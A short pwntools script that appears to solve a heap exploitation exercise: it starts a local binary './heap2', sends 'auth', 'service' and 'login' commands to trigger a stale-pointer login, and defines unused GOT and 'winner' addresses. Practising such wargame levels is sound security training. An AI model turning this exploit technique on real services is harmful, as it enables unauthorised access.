import pwn as p

puts_got_addr = p.p32(0x0804a018)
winner_addr = p.p32(0x080484b6)

target = p.process('./heap2')

target.sendline('auth ')

target.sendline('service 0')

target.sendline('login')

target.interactive()
